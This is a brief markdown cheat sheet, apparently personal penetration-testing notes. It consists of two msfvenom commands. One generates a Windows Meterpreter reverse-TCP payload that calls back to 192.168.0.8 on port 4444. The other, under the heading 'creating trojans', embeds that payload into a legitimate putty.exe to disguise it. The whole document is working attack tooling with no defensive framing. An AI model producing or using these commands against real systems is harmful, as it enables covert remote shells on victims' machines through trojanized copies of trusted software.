# Generating payloads

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.8 LPORT=4444 -f exe -o yolo.exe`

# creating trojans
 
 Adds the msfvenom payload to a normal putty file
 `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.8 LPORT=4444 -x putty.exe`